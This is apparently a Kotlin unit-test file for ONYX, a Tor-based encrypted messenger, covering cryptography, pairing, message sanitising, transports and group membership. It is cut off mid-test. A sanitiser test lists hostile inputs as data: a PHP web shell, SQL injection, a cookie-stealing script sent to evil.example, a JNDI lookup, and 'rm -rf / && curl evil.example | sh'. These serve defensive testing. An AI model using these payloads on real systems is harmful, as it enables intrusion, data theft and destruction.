// SPDX-License-Identifier: AGPL-3.0-only
package io.github.proteu5.onyx.core

import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.net.ServerSocket
import java.security.MessageDigest
import kotlin.concurrent.thread

class CoreTest {

    private inline fun <reified T : Throwable> assertFails(block: () -> Unit) {
        try { block() } catch (t: Throwable) { if (t is T) return; throw t }
        fail("expected ${T::class.java.simpleName}")
    }

    // ---------- SHA3 / onion ----------

    @Test fun sha3MatchesJdk() {
        val jdk = MessageDigest.getInstance("SHA3-256")
        for (len in listOf(0, 1, 55, 135, 136, 137, 271, 272, 1000)) {
            val msg = Bytes.random(len)
            assertArrayEquals("len=$len", jdk.digest(msg), Sha3.sha3_256(msg))
        }
    }

    @Test fun sha3KnownVector() {
        // FIPS 202 SHA3-256("abc")
        assertEquals(
            "3a985da74fe225b2045c172d6bd390bd855f086e3e9d525b46bfe24511431532",
            Bytes.hex(Sha3.sha3_256("abc".toByteArray()))
        )
    }

    @Test fun onionKnownAddressParses() {
        // The Tor Project's own v3 onion (published at torproject.org)
        val a = OnionAddress.parse("2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion")
        assertEquals("2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion", a.hostname)
    }

    @Test fun onionRoundTripAndChecksum() {
        val pk = Bytes.random(32)
        val a = OnionAddress.fromPublicKey(pk)
        assertEquals(56, a.label.length)
        assertEquals(a, OnionAddress.parse(a.hostname))
        val chars = a.label.toCharArray()
        chars[10] = if (chars[10] == 'a') 'b' else 'a'
        assertFails<MalformedException> { OnionAddress.parse(String(chars)) }
        assertFails<MalformedException> { OnionAddress.parse("example.com") }
    }

    @Test fun base32RoundTrip() {
        for (len in 0..40) {
            val b = Bytes.random(len)
            assertArrayEquals(b, Base32.decode(Base32.encode(b)))
        }
    }

    // ---------- HKDF (RFC 5869 test case 1) ----------

    @Test fun hkdfRfc5869Case1() {
        fun h(s: String) = s.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        val prk = Kdf.extract(h("000102030405060708090a0b0c"), h("0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b"))
        assertEquals("077709362c2e32df0ddc3f0dc47bba6390b6c73bb50f9c3122ec844ad7c2b3e5", Bytes.hex(prk))
        val okm = Kdf.expand(prk, h("f0f1f2f3f4f5f6f7f8f9"), 42)
        assertEquals(
            "3cb25f25faacd57a90434f64d0362f2a2d2d0a90cf1a5a4c5db02d56ecc4c5bf34007208d5b887185865",
            Bytes.hex(okm)
        )
    }

    // ---------- padding ----------

    @Test fun paddingHidesLength() {
        assertEquals(256, Padding.pad(ByteArray(0)).size)
        assertEquals(256, Padding.pad(ByteArray(255)).size)
        assertEquals(1024, Padding.pad(ByteArray(256)).size)
        for (len in listOf(0, 1, 100, 255, 256, 5000)) {
            val d = Bytes.random(len)
            assertArrayEquals(d, Padding.unpad(Padding.pad(d)))
        }
    }

    @Test fun paddingRejectsGarbage() {
        assertFails<MalformedException> { Padding.unpad(ByteArray(256)) }       // all zero
        assertFails<MalformedException> { Padding.unpad(ByteArray(100)) }       // not a bucket
    }

    // ---------- frames ----------

    @Test fun framesRoundTripAndArePadded() {
        val bos = ByteArrayOutputStream()
        val w = FrameCodec(ByteArrayInputStream(ByteArray(0)), bos)
        val frames = listOf(
            Frame.Challenge(Bytes.random(32)),
            Frame.Hello(Bytes.random(32), Bytes.random(32)),
            Frame.Welcome(Bytes.random(32)),
            Frame.Message(3, Bytes.random(1700)),
            Frame.Ack(Bytes.random(16)),
            Frame.Reject, Frame.Bye,
        )
        frames.forEach { w.write(it) }
        val wire = bos.toByteArray()
        val r = FrameCodec(ByteArrayInputStream(wire), ByteArrayOutputStream())
        frames.forEach { expected ->
            val got = r.read()
            assertEquals(expected.type, got.type)
            assertArrayEquals(expected.body(), got.body())
        }
        // Every frame occupies a bucket: 4-byte length + bucket bytes.
        assertEquals(0, (wire.size - 4 * frames.size) % 1024)
    }

    @Test fun wireTapSeesExactPaddedBytesAndNoPlaintext() {
        val secret = "super secret plaintext".toByteArray()
        val bos = ByteArrayOutputStream()
        val w = FrameCodec(ByteArrayInputStream(ByteArray(0)), bos)
        val seen = ArrayList<Triple<WireDirection, Int, ByteArray>>()
        w.tap = { d, t, b -> seen += Triple(d, t, b) }
        val ct = Bytes.random(183)                       // stands in for libsignal ciphertext
        w.write(Frame.Message(2, ct))
        assertEquals(1, seen.size)
        assertEquals(WireDirection.OUT, seen[0].first)
        assertArrayEquals(bos.toByteArray(), seen[0].third) // tap == exact bytes on the wire
        assertEquals(1028, seen[0].third.size)
        assertFalse(String(seen[0].third, Charsets.ISO_8859_1).contains(String(secret)))
        val desc = WireAnatomy.describe(seen[0].second, seen[0].third)
        assertTrue(desc.contains("bucket 1024 B")); assertTrue(desc.contains("Triple Ratchet"))
        // reader side tap
        val r = FrameCodec(ByteArrayInputStream(bos.toByteArray()), ByteArrayOutputStream())
        var inSeen: ByteArray? = null
        r.tap = { d, _, b -> assertEquals(WireDirection.IN, d); inSeen = b }
        r.read()
        assertArrayEquals(bos.toByteArray(), inSeen!!)
        assertTrue(WireAnatomy.hexDump(inSeen!!, 32).startsWith("00000000  00 00 04 00"))
    }

    @Test fun linkAuthIdentifiesOnlyTheRightContact() {
        val keys = (1..5).map { "c$it" to Bytes.random(32) }
        val nonceS = Bytes.random(32); val nonceC = Bytes.random(32)
        val hello = Frame.Hello(nonceC, LinkAuth.helloTag(keys[3].second, nonceS, nonceC))
        assertEquals("c4", LinkAuth.identify(keys, nonceS, hello))
        // Replay against a fresh server challenge fails.
        assertNull(LinkAuth.identify(keys, Bytes.random(32), hello))
        // Stranger fails.
        assertNull(LinkAuth.identify(keys, nonceS, Frame.Hello(nonceC, Bytes.random(32))))
    }

    // ---------- pairing ----------

    @Test fun pairingHappyPath() {
        val now = 1_800_000_000L
        val bOnion = OnionAddress.fromPublicKey(Bytes.random(32))
        val bIdentity = Bytes.random(33)
        val code = Pairing.Code.create(bOnion, bIdentity, now)
        val text = code.encode()
        assertTrue(text.length < 160)

        // A scans
        val scanned = Pairing.Code.decode(text)
        assertFalse(scanned.isExpired(now + 60))
        assertTrue(scanned.isExpired(now + 601))
        val aKeys = scanned.keys
        val req = Pairing.Request.create(aKeys, Bytes.random(33), Bytes.random(32), null)

        // B receives
        val bKeys = code.keys
        val reqRx = Pairing.Request.decode(req.encode())
        assertTrue(reqRx.verify(bKeys))
        val bundle = PreKeyBundleWire(1, 1, 7, Bytes.random(33), 2, Bytes.random(33), Bytes.random(64),
            bIdentity, 3, Bytes.random(1569), Bytes.random(64))
        val resp = Pairing.Response.create(bKeys, reqRx, bundle.encode(), Bytes.random(32))

        // A verifies
        val respRx = Pairing.Response.decode(resp.encode())
        assertTrue(respRx.verify(aKeys, req))
        val bundleRx = PreKeyBundleWire.decode(respRx.bundle)
        assertArrayEquals(scanned.identityCommit, Bytes.sha256(bundleRx.identityKey))
        assertArrayEquals(aKeys.linkKey, bKeys.linkKey)
    }

    @Test fun pairingRejectsWrongSecretAndTampering() {
        val code = Pairing.Code.create(OnionAddress.fromPublicKey(Bytes.random(32)), Bytes.random(33), 0)
        val other = Pairing.Code.create(code.onion, Bytes.random(33), 0)
        val req = Pairing.Request.create(other.keys, Bytes.random(33), Bytes.random(32), null)
        assertFalse(req.verify(code.keys))

        val good = Pairing.Request.create(code.keys, Bytes.random(33), Bytes.random(32), null)
        val tampered = good.encode().also { it[20] = (it[20].toInt() xor 1).toByte() }
        assertFalse(Pairing.Request.decode(tampered).verify(code.keys))

        val resp = Pairing.Response.create(code.keys, good, Bytes.random(100), null)
        // Response bound to a different request must fail.
        val req2 = Pairing.Request.create(code.keys, Bytes.random(33), Bytes.random(32), null)
        assertFalse(resp.verify(code.keys, req2))
    }

    @Test fun pairingCodeRejectsJunk() {
        assertFails<MalformedException> { Pairing.Code.decode("https://evil.example") }
        assertFails<MalformedException> { Pairing.Code.decode("onyx1:!!!") }
        assertFails<MalformedException> { Pairing.Code.decode("onyx1:AQ") }
    }

    @Test fun remoteInviteRoundTripIsFlaggedAndExtractable() {
        val now = 1_800_000_000L
        val code = Pairing.Code.createRemote(OnionAddress.fromPublicKey(Bytes.random(32)), Bytes.random(33), now)
        val text = code.encode()
        val shared = "Hey, join me on ONYX:\n$text\n(valid 24h)"
        val found = Pairing.Code.extract(shared)
        assertEquals(text, found)
        val d = Pairing.Code.decode(found!!)
        assertTrue(d.remote)
        assertFalse(d.isExpired(now + 23 * 3600))
        assertTrue(d.isExpired(now + 24 * 3600 + 1))
        assertFalse(Pairing.Code.decode(Pairing.Code.create(code.onion, Bytes.random(33), now).encode()).remote)
        assertNull(Pairing.Code.extract("no code here onyx1:short"))
    }

    // ---------- message policy ----------

    private val forbidden = "<>{}[]`$\\|;=#%&*_@/^~+"

    private fun assertPolicy(full: String) {
        assertTrue("too long: ${full.length}", full.codePointCount(0, full.length) <= MessagePolicy.MAX_CHARS)
        // Accepted links are the one exception to the symbol rules; check everything around them.
        var out = full
        // A link counts as one word.
        MessagePolicy.linkRanges(full).reversed().forEach { r -> out = out.replaceRange(r, "LINK") }
        out.forEach { c -> assertFalse("forbidden '$c' in \"$out\"", forbidden.indexOf(c) >= 0) }
        assertFalse(out.contains('\n'))
        // no two symbols adjacent (ignoring spaces)
        val compact = out.replace(" ", "")
        for (i in 1 until compact.length) {
            val a = compact[i - 1]; val b = compact[i]
            assertFalse("consecutive symbols in \"$out\"", !a.isLetterOrDigit() && !b.isLetterOrDigit() && !Character.isSurrogate(a) && !Character.isSurrogate(b))
        }
    }

    @Test fun policyNeutralisesInjectionPayloads() {
        val payloads = listOf(
            "<?php system(\$_GET['c']); ?>",
            "'; DROP TABLE users; --",
            "<script>fetch('https://evil.example/?c='+document.cookie)</script>",
            "\${jndi:ldap://evil.example/a}",
            "rm -rf / && curl evil.example | sh",
            "{{7*7}} \${7*7} <%= 7*7 %>",
            "`whoami`; \$(id)",
            "=HYPERLINK(\"http://x\",\"y\")",
        )
        for (p in payloads) {
            val out = MessagePolicy.sanitize(p)
            assertPolicy(out)
        }
        assertEquals("?php system(GET'c'", MessagePolicy.sanitize("<?php system(\$_GET['c']); ?>"))
        assertEquals("' DROP TABLE users -", MessagePolicy.sanitize("'; DROP TABLE users; --"))
        assertEquals("jndi:ldap:evil.examplea", MessagePolicy.sanitize("\${jndi:ldap://evil.example/a}"))
    }

    @Test fun policyKeepsNormalConversation() {
        assertEquals("Hey! Are we still on for 7:30 tonight?", MessagePolicy.sanitize("Hey!! Are we still on for 7:30 tonight??"))
        assertEquals("Guten Tag, ça va? Привет 你好", MessagePolicy.sanitize("Guten Tag, ça va? Привет 你好"))
        assertEquals("ok 👍", MessagePolicy.sanitize("ok 👍👍👍"))
        assertEquals("line one line two", MessagePolicy.sanitize("line one\nline two"))
    }

    @Test fun policyStripsInvisiblesAndLookalikes() {
        assertEquals("admin", MessagePolicy.sanitize("ad\u200Bmin"))            // zero-width space
        assertEquals("abc", MessagePolicy.sanitize("\u202Eabc\u202C"))            // bidi override removed
        assertEquals("script", MessagePolicy.sanitize("\uFF1Cscript\uFF1E"))   // fullwidth < >
        assertEquals("", MessagePolicy.sanitize("<<<>>>{}\u0000\u200D"))
    }

    @Test fun policyTruncatesTo500CodePoints() {
        val out = MessagePolicy.sanitize("a".repeat(900))
        assertEquals(500, out.length)
        val emoji = MessagePolicy.sanitize("x😀".repeat(400))
        assertTrue(emoji.codePointCount(0, emoji.length) <= 500)
        assertFalse(Character.isHighSurrogate(emoji.last()))                  // never split a surrogate pair
    }

    @Test fun rateLimitStopsBulkSending() {
        val now = 1_000_000L
        assertTrue(MessagePolicy.rateAllowed(emptyList(), now))
        assertFalse(MessagePolicy.rateAllowed(listOf(now - 100), now))        // faster than 0.7 s
        assertTrue(MessagePolicy.rateAllowed(listOf(now - 1000), now))
        assertFalse(MessagePolicy.rateAllowed(List(20) { now - 50_000 + it }, now))  // 20/min cap
        assertTrue(MessagePolicy.rateAllowed(List(20) { now - 70_000 + it }, now))   // older than a minute
    }

    // ---------- envelope ----------

    @Test fun envelopeRoundTripAndBucketed() {
        val e = Envelope.text("hello ONYX", 1_790_000_000_000L)
        val p = e.encodePadded()
        assertEquals(Envelope.TEXT_BUCKET, p.size)          // every text message: one size
        val d = Envelope.decodePadded(p)
        assertEquals(Envelope.Kind.TEXT, d.kind)
        assertEquals("hello ONYX", String(d.body))
        assertEquals(1_790_000_000_000L / 60_000, d.sentAtMinute)
    }

    // ---------- SOCKS5 against a fake Tor ----------

    @Test fun socks5SendsHostnameNeverIp() {
        val onion = OnionAddress.fromPublicKey(Bytes.random(32))
        ServerSocket(0).use { ss ->
            var seenHost = ""
            val t = thread {
                ss.accept().use { c ->
                    val i = java.io.DataInputStream(c.getInputStream()); val o = c.getOutputStream()
                    i.readFully(ByteArray(3)); o.write(byteArrayOf(5, 0))
                    val hdr = ByteArray(4); i.readFully(hdr)
                    assertEquals(3, hdr[3].toInt()) // ATYP = domain name
                    val host = ByteArray(i.readUnsignedByte()); i.readFully(host); i.readFully(ByteArray(2))
                    seenHost = String(host)
                    o.write(byteArrayOf(5, 0, 0, 1, 0, 0, 0, 0, 0, 0))
                    o.write("pong".toByteArray()); o.flush()
                }
            }
            Socks5.connect(ss.localPort, onion, 9878).use { s ->
                val buf = ByteArray(4); java.io.DataInputStream(s.getInputStream()).readFully(buf)
                assertEquals("pong", String(buf))
            }
            t.join()
            assertEquals(onion.hostname, seenHost)
        }
    }

    @Test fun socks5SurfacesOnionErrors() {
        val onion = OnionAddress.fromPublicKey(Bytes.random(32))
        ServerSocket(0).use { ss ->
            val t = thread {
                ss.accept().use { c ->
                    val i = java.io.DataInputStream(c.getInputStream()); val o = c.getOutputStream()
                    i.readFully(ByteArray(3)); o.write(byteArrayOf(5, 0))
                    i.readFully(ByteArray(4)); i.readFully(ByteArray(i.readUnsignedByte())); i.readFully(ByteArray(2))
                    o.write(byteArrayOf(5, 0xF0.toByte(), 0, 1, 0, 0, 0, 0, 0, 0)); o.flush()
                }
            }
            try {
                Socks5.connect(ss.localPort, onion, 9878); fail("should throw")
            } catch (e: Socks5.SocksException) {
                assertTrue(e.message!!.contains("offline"))
            }
            t.join()
        }
    }

    // ---------- SMS ----------

    @Test fun smsFixedPartsAndReassembly() {
        val ct = Bytes.random(300)
        val parts = SmsCodec.encode(2, ct)
        assertEquals(SmsCodec.PARTS_PER_MESSAGE, parts.size)
        parts.forEach { assertTrue(it.length <= SmsCodec.MAX_CHARS) }
        // Two different-sized messages produce identical part lengths.
        assertEquals(parts.map { it.length }, SmsCodec.encode(2, Bytes.random(10)).map { it.length })
        val r = SmsCodec.Reassembler()
        assertNull(r.offer("+1555", parts[2])); assertNull(r.offer("+1555", parts[0])); assertNull(r.offer("+1555", parts[3]))
        val (type, got) = r.offer("+1555", parts[1])!!
        assertEquals(2, type); assertArrayEquals(ct, got)
        assertNull(r.offer("+1555", "hey, normal text"))
    }

    // ---------- transport ----------

    @Test fun transportNeverDowngradesToSmsWhileTorWorks() {
        val base = TransportContext(true, null, true, false, smsAllowedForContact = true, hasCellular = true)
        assertEquals(listOf(Transport.TOR_DIRECT, Transport.TOR_MAILBOX), TransportSelector.plan(base))
        assertEquals(listOf(Transport.SMS), TransportSelector.plan(base.copy(torReady = false)))
        assertEquals(emptyList<Transport>(), TransportSelector.plan(base.copy(torReady = false, smsAllowedForContact = false)))
        val d = TransportSelector.retryDelayMs(20, 1.0)
        assertTrue(d <= 45 * 60_000L)
    }

    // ---------- Forge rank ----------

    @Test fun forgeTiers() {
        fun t(h: Long, p: Long, on: Boolean = true) = ForgeRank.tierFor(ForgeRank.Stats(h * 3600, p, on))
        assertEquals(ForgeRank.Tier.NONE, t(5000, 99999, on = false))
        assertEquals(ForgeRank.Tier.EMBER, t(0, 0))
        assertEquals(ForgeRank.Tier.SPARK, t(10, 0))
        assertEquals(ForgeRank.Tier.SPARK, t(0, 25))
        assertEquals(ForgeRank.Tier.FLAME, t(49, 250))
        assertEquals(ForgeRank.Tier.FORGE, t(200, 0))
        assertEquals(ForgeRank.Tier.CRUCIBLE, t(0, 5000))
    }

    @Test fun badgeCarriesOnlyTierAndCover() {
        val b = ForgeRank.Badge(ForgeRank.Tier.FLAME, ForgeRank.Cover.SIGIL)
        val enc = b.encode()
        assertEquals(3, enc.size)
        assertEquals(b, ForgeRank.Badge.decode(enc))
    }

    @Test fun snowflakeGuardrails() {
        val g = ForgeRank.Guardrails(true, true, true, 0, 1_000_000)
        assertTrue(g.allowed())
        assertFalse(g.copy(charging = false).allowed())
        assertFalse(g.copy(onUnmeteredWifi = false).allowed())
        assertFalse(g.copy(bytesToday = 1_000_000).allowed())
        assertFalse(g.copy(userEnabled = false).allowed())
    }

    // ---- Mailbox (v1.4.0) ----

    private fun roundTrip(f: Frame): Frame {
        val out = ByteArrayOutputStream()
        FrameCodec(ByteArrayInputStream(ByteArray(0)), out).write(f)
        return FrameCodec(ByteArrayInputStream(out.toByteArray()), ByteArrayOutputStream()).read()
    }

    @Test fun mailboxFramesRoundTrip() {
        val tag = Bytes.random(Mailbox.TAG_LEN)
        val msg = Frame.Message(3, Bytes.random(900))
        val item = roundTrip(Frame.MailboxItem(tag, msg)) as Frame.MailboxItem
        assertArrayEquals(tag, item.tag)
        assertEquals(3, item.message.signalType)
        assertArrayEquals(msg.ciphertext, item.message.ciphertext)
        assertArrayEquals(msg.digest(), item.message.digest())

        val entries = List(5) { Bytes.random(Mailbox.TAG_LEN) to Bytes.random(32) }
        val keys = roundTrip(Frame.MailboxKeys(entries)) as Frame.MailboxKeys
        assertEquals(5, keys.entries.size)
        entries.zip(keys.entries).forEach { (a, b) -> assertArrayEquals(a.first, b.first); assertArrayEquals(a.second, b.second) }

        assertTrue(roundTrip(Frame.Fetch) is Frame.Fetch)
        assertTrue(roundTrip(Frame.MailboxDone) is Frame.MailboxDone)
        assertTrue(roundTrip(Frame.MailboxKeys(emptyList())) is Frame.MailboxKeys)
    }

    @Test fun mailboxKeysAreDeterministicAndSeparate() {
        val link = Bytes.random(32)
        assertArrayEquals(Mailbox.depositKey(link), Mailbox.depositKey(link.copyOf()))
        assertArrayEquals(Mailbox.tag(link), Mailbox.tag(link.copyOf()))
        assertEquals(Mailbox.TAG_LEN, Mailbox.tag(link).size)
        // The deposit key never equals the link key itself, nor the tag prefix, nor another contact's key.
        assertFalse(Bytes.ctEquals(Mailbox.depositKey(link), link))
        assertFalse(Bytes.ctEquals(Mailbox.depositKey(link).copyOf(Mailbox.TAG_LEN), Mailbox.tag(link)))
        assertFalse(Bytes.ctEquals(Mailbox.depositKey(link), Mailbox.depositKey(Bytes.random(32))))
    }

    @Test fun mailboxKeysRejectOversizedList() {
        val body = ByteWriter(2).u16(Mailbox.MAX_DEPOSITORS + 1).toByteArray()
        assertFails<MalformedException> { Frame.decode(Frame.T_MBOX_KEYS, body) }
    }

    @Test fun envelopeMailboxKindRoundTrip() {
        val e = Envelope(Envelope.Kind.MAILBOX, Bytes.random(16), 1, Bytes.random(32))
        val d = Envelope.decodePadded(e.encodePadded())
        assertEquals(Envelope.Kind.MAILBOX, d.kind)
        assertArrayEquals(e.body, d.body)
    }

    // ---------------------------------------------------------------- groups (v1.4.1)

    /** Test stand-in for an identity signature: 64 bytes derived from the key and the signed bytes. */
    private fun fakeSig(ik: ByteArray, msg: ByteArray) = Bytes.sha256(ik, msg) + Bytes.sha256(msg, ik)
    private val fakeVerify: (ByteArray, ByteArray, ByteArray) -> Boolean = { ik, msg, sig -> Bytes.ctEquals(sig, fakeSig(ik, msg)) }

    private class Member(val onion: ByteArray = Bytes.random(32), val ik: ByteArray = Bytes.random(33))

    private class G(val creator: Member, title: String = "G", vo: Boolean = false) {
        val nonce = Bytes.random(16)
        val id = Groups.deriveId(creator.onion, creator.ik, title, vo, nonce)
        val empty = Groups.State(id, title, vo, creator.onion, creator.ik, nonce, emptyList())
    }

    private fun entry(g: G, m: Member, version: Long, present: Boolean, joined: Long = 100, voucher: Member? = null,
                      voucherSigner: Member? = voucher): Groups.Entry {
        val vo = voucher?.onion
        val vs = voucher?.let { fakeSig(voucherSigner!!.ik, Groups.voucherBytes(g.id, m.onion, m.ik)) }
        return Groups.Entry(m.onion, m.ik, version, present, joined, vo, vs,
            fakeSig(m.ik, Groups.signedBytes(g.id, m.onion, m.ik, version, present, joined, vo)))
    }

    private fun st(g: G, vararg e: Groups.Entry) = g.empty.withEntries(e.toList())
    private fun merge(a: Groups.State, b: Groups.State, pinned: (ByteArray) -> ByteArray? = { null }, conflicts: MutableList<ByteArray>? = null) =
        Groups.merge(a, b, fakeVerify, pinned) { conflicts?.add(it) }

    @Test fun groupStateRoundTripAndGenesis() {
        val c = Member(); val g = G(c, "Book club", true); val b = Member()
        val s = st(g, entry(g, c, 1, true), entry(g, b, 2, false, voucher = c))
        val d = Groups.State.decode(s.encode())
        assertEquals("Book club", d.title); assertTrue(d.verifiedOnly); assertEquals(2, d.entries.size)
        assertArrayEquals(s.encode(), d.encode())
        // Flipping verified-only or renaming breaks the id: rejected.
        val tampered = Groups.State(g.id, "Book club", false, c.onion, c.ik, g.nonce, s.entries)
        assertFails<MalformedException> { Groups.State.decode(tampered.encode()) }
        val renamed = Groups.State(g.id, "Other", true, c.onion, c.ik, g.nonce, s.entries)
        assertFails<MalformedException> { Groups.State.decode(renamed.encode()) }
    }

    @Test fun groupMergeConvergesInAnyOrder() {
        val c = Member(); val g = G(c); val a = Member(); val b = Member()
        val s1 = st(g, entry(g, c, 1, true), entry(g, a, 1, true, voucher = c))
        val s2 = st(g, entry(g, c, 1, true), entry(g, a, 2, false, voucher = c), entry(g, b, 1, true, voucher = c))
        val s3 = st(g, entry(g, c, 3, false))
        val x = merge(merge(merge(g.empty, s1), s2), s3)
        val y = merge(merge(merge(g.empty, s3), s2), s1)
        assertFalse(Groups.differs(x, y)); assertFalse(Groups.differs(y, x))
        assertEquals(listOf(Bytes.hex(b.onion)), x.active().map { it.key })
        // Same version, different content: every phone keeps the same one.
        val t1 = entry(g, b, 5, true, joined = 100, voucher = c); val t2 = entry(g, b, 5, true, joined = 101, voucher = c)
        val base = st(g, entry(g, c, 1, true))
        val p = merge(merge(base, st(g, t1)), st(g, t2)); val q = merge(merge(base, st(g, t2)), st(g, t1))
        assertEquals(p.entry(b.onion)!!.joinedAtMinute, q.entry(b.onion)!!.joinedAtMinute)
    }

    @Test fun groupMergeRejectsForgeriesAndSelfAdds() {
        val c = Member(); val g = G(c); val a = Member(); val b = Member(); val stranger = Member()
        val local = merge(g.empty, st(g, entry(g, c, 1, true), entry(g, a, 1, true, voucher = c), entry(g, b, 1, true, voucher = c)))
        assertEquals(3, local.active().size)
        // b "removes" a: signed with b's key, not a's.
        val forged = Groups.Entry(a.onion, a.ik, 2, false, 100, c.onion, entry(g, a, 1, true, voucher = c).voucherSig,
            fakeSig(b.ik, Groups.signedBytes(g.id, a.onion, a.ik, 2, false, 100, c.onion)))
        assertTrue(merge(local, st(g, forged)).isActive(a.onion))
        // A contact who learned the group id can't add themselves: no voucher, or a voucher they signed themselves.
        val noVoucher = Groups.Entry(stranger.onion, stranger.ik, 1, true, 100, null, null,
            fakeSig(stranger.ik, Groups.signedBytes(g.id, stranger.onion, stranger.ik, 1, true, 100, null)))
        assertFalse(merge(local, st(g, noVoucher)).isActive(stranger.onion))
        assertFalse(merge(local, st(g, entry(g, stranger, 1, true, voucher = a, voucherSigner = stranger))).isActive(stranger.onion))
        // A real voucher works, and its holder can't claim to have joined before the voucher.
        assertTrue(merge(local, st(g, entry(g, stranger, 1, true, joined = 100, voucher = a))).isActive(stranger.onion))
        assertFalse(merge(local, st(g, entry(g, stranger, 1, true, joined = 5, voucher = a))).isActive(stranger.onion))
        // Someone else's key for a's onion: conflict reported, never accepted.
        val conflicts = mutableListOf<ByteArray>()
        val evil = Member(onion = a.onion)
        val m = merge(local, st(g, entry(g, evil, 9, false, voucher = b)), conflicts = conflicts)
        assertTrue(m.isActive(a.onion)); assertArrayEquals(a.onion, conflicts.single())
        // A paired contact's key wins over a roster claim for an onion we haven't seen in this group yet.
        val d = Member(); val fakeD = Member(onion = d.onion)
        assertFalse(merge(local, st(g, entry(g, fakeD, 1, true, voucher = b)), pinned = { if (Bytes.ctEquals(it, d.onion)) d.ik else null }).isActive(d.onion))
        // The creator slot only takes the creator's key from the group id.
        val fakeCreator = Member(onion = c.onion)
        assertFalse(merge(g.empty, st(g, entry(g, fakeCreator, 1, true))).entries.any { Bytes.ctEquals(it.identityKey, fakeCreator.ik) })
        // Versions near the top are refused, so a member can always still sign a leave.
        assertFalse(merge(local, st(g, entry(g, a, Groups.MAX_VERSION + 1, false, voucher = c))).entries.any { it.version > Groups.MAX_VERSION })
    }

    @Test fun groupVouchersArriveInAnyOrder() {
        val c = Member(); val g = G(c); val a = Member(); val b = Member()
        // b was vouched for by a; a's entry comes after b's in the list.
        val s = st(g, entry(g, b, 1, true, joined = 110, voucher = a), entry(g, a, 1, true, joined = 105, voucher = c), entry(g, c, 1, true))
        assertEquals(3, merge(g.empty, s).active().size)
    }

    @Test fun groupLeaveWinsTieAndRejoinNeedsHigherVersion() {
        val c = Member(); val g = G(c); val a = Member()
        val base = st(g, entry(g, c, 1, true))
        val joined = merge(base, st(g, entry(g, a, 4, true, voucher = c)))
        val left = merge(base, st(g, entry(g, a, 4, false, voucher = c)))
        assertFalse(merge(joined, left).isActive(a.onion))
        assertFalse(merge(left, joined).isActive(a.onion))
        assertTrue(merge(left, st(g, entry(g, a, 5, true, voucher = c))).isActive(a.onion))
    }

    @Test fun groupActiveIsCappedAndNothingIsEvicted() {
        val c = Member(); val g = G(c)
        val members = List(10) { Member() }
        val entries = listOf(entry(g, c, 1, true, joined = 50)) + members.mapIndexed { i, m -> entry(g, m, 1, true, joined = 100L + i, voucher = c) }
        val s = merge(g.empty, st(g, *entries.shuffled().toTypedArray()))
        assertEquals(Groups.MAX_MEMBERS, s.active().size)
        assertEquals((listOf(c) + members.take(7)).map { Bytes.hex(it.onion) }.toSet(), s.active().map { it.key }.toSet())
        assertTrue(s.isFull())
        // Roster full of entries: new onions are refused rather than old ones dropped.
        val many = List(Groups.MAX_ENTRIES) { Member() }
        val full = merge(g.empty, st(g, *(listOf(entry(g, c, 1, true)) + many.take(Groups.MAX_ENTRIES - 1).map { entry(g, it, 1, false, voucher = c) }).toTypedArray()))
        assertEquals(Groups.MAX_ENTRIES, full.entries.size)
        assertEquals(Groups.MAX_ENTRIES, merge(full, st(g, entry(g, many.last(), 1, true, voucher = c))).entries.size)
        assertFails<MalformedException> {
            val dup = st(g, entry(g, c, 1, true), entry(g, c, 1, true))
            Groups.State.decode(dup.encode())
        }
    }

    @Test fun groupTextAndIntroRoundTrip() {
        val gid = Bytes.random(16)
        val t = Groups.Text.decode(Groups.Text(gid, "hi all").encode())
        assertArrayEquals(gid, t.groupId); assertEquals("hi all", t.text)
        val a = Bytes.random(32); val b = Bytes.random(32)
        val i = Groups.Intro(Bytes.random(16), gid, a, b, "onyx1:abc", Groups.MAX_HOPS)
        val d = Groups.Intro.decode(i.encode())
        assertEquals("onyx1:abc", d.code); assertEquals(Groups.MAX_HOPS - 1, d.relayed().hops)
        assertTrue(Groups.iIntroduce(a, b) != Groups.iIntroduce(b, a))
        for (k in listOf(Envelope.Kind.GROUP_INVITE, Envelope.Kind.GROUP_STATE, Envelope.Kind.GROUP_TEXT, Envelope.Kind.GROUP_INTRO)) {
            assertEquals(k, Envelope.decodePadded(Envelope(k, Bytes.random(16), 1, Bytes.random(40)).encodePadded()).kind)
        }
    }

    // ---------------------------------------------------------------- v1.4.4: links, padding, images

    @Test fun linksAreKeptCleanedAndBounded() {
        assertEquals("see https://example.com/a?id=5.", MessagePolicy.sanitize("see HTTPS://Example.COM/a?utm_source=x&id=5&fbclid=abc."))
        assertEquals("https://en.wikipedia.org/wiki/Onyx_(mineral)", MessagePolicy.sanitize("https://en.wikipedia.org/wiki/Onyx_(mineral)"))
        assertEquals("(https://example.com/x)", MessagePolicy.sanitize("(https://example.com/x)"))
        assertEquals("https://example.com/p", MessagePolicy.sanitize("https://example.com/p?utm_medium=a&gclid=b"))
        // "real.com@evil" trick: not a link, so it's filtered like ordinary text (no @, no //).
        val trick = MessagePolicy.sanitize("https://bank.com@evil.example/login")
        assertFalse(trick.contains('@')); assertTrue(MessagePolicy.linkRanges(trick).isEmpty())
        // Non-ASCII look-alike host: not a link.
        assertTrue(MessagePolicy.linkRanges(MessagePolicy.sanitize("https://ex\u0430mple.com/x")).isEmpty())
        // Only http(s); no host without a dot.
        assertTrue(MessagePolicy.linkRanges(MessagePolicy.sanitize("javascript:alert(1) ftp://a.com http://localhost/x")).isEmpty())
        // At most 3 links.
        val four = MessagePolicy.sanitize((1..4).joinToString(" ") { "https://a$it.com" })
        assertEquals(3, MessagePolicy.linkRanges(four).size)
        val t = MessagePolicy.sanitize("go to https://a.com/x, then https://b.org!")
        assertEquals(listOf("https://a.com/x", "https://b.org"), MessagePolicy.linkRanges(t).map { t.substring(it) })
        assertEquals("b.org", MessagePolicy.linkHost("https://b.org"))
        assertPolicy(MessagePolicy.sanitize("<script>fetch('https://evil.example/?c='+document.cookie)</script>"))
    }

    @Test fun textPadsToOneSizeAndImagesToAnother() {
        val short = Envelope.text("ok", 0).encodePadded().size
